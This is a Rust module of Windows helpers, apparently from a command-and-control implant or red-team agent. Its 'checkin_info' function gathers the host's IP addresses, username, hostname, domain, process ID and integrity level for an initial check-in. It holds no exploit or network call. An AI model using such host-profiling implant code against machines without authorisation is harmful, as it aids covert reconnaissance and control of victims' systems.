//! Helper functions specific to Windows systems

use std::time::Duration;

use windows::Win32::System::SystemInformation::GetSystemTime;

use crate::CheckinInfo;

pub mod info;
pub mod winhelpers;

/// Get the time elapsed since midnight
pub fn get_timeofday() -> Duration {
    let system_time = unsafe { GetSystemTime() };

    let hour = system_time.wHour as u64 * 3600;
    let minute = system_time.wMinute as u64 * 60;
    let second = system_time.wSecond as u64;
    return Duration::from_secs(hour + minute + second);
}

/// Get the initial check in information for Windows
pub fn checkin_info() -> CheckinInfo {
    CheckinInfo {
        ips: info::internal_ips().ok(),
        os: info::platform(),
        user: info::username().ok(),
        host: info::hostname().ok(),
        pid: std::process::id(),
        architecture: std::env::consts::ARCH.to_string(),
        domain: info::domain().ok(),
        integrity_level: info::integrity_level().unwrap_or(0),
        process_name: info::process_name().ok(),
    }
}
